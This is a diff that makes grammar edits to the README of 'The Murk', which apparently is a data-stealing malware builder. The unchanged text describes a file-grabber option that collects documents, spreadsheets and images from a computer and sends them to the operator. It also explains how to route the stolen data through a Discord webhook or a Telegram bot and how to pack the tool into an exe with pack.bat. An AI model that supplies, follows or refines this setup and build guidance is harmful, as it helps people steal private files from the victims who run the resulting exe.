@@ -167,7 +167,7 @@ Foremost, download the source code. Then go to `The Murk\preferences` dir and op
 
 > * `enableFileGrabber`
 > 
-> If you set this var as `True`, all files with extensions `.txt; .docx; .csv; .xls; .png; .jpg` will be collected from computer and sent to you
+> If you set this var as `True`, all files with extensions `.txt; .docx; .csv; .xls; .png; .jpg` will be collected from the computer and sent to you
 > 
 > * `oneStart`
 > 
@@ -193,11 +193,11 @@ So firstly, create your Discord server and webhook there. [How to do it](https:/
 
 **For Telegram**
 
-So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot, copy HTTP API of bot. Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and copy the id too. Then, insert the HTTP API and the id in a separate fields as in example `[1, "HTTP API", "chat ID"]`, don't forget to change the first var from 0 to 1.
+So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot, copy HTTP API of bot. Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and copy the id too. Then, insert the HTTP API and the id in separate fields as in example `[1, "HTTP API", "chat ID"]`, don't forget to change the first var from 0 to 1.
 
 **Packing**
 
-Finally, to let all this deal work you need to download [python](https://www.python.org/downloads/). Then open cmd in The Murk dir insert in the console `pip install -r requirements.txt`, and wait till all downloads are completed. To pack all of it into an exe file just run `pack.bat`, and wait till the end of packing. The exe file gonna be placed in the dist folder.
+Finally, to let all this deal work you need to download [python](https://www.python.org/downloads/). Then open cmd in the main project dir insert in the console `pip install -r requirements.txt`, and wait till all downloads are completed. To pack all of it into an exe file just run `pack.bat`, and wait till the end of packing. The exe file gonna be placed in the dist folder.
 
 ---
 ### ❌Builder errors
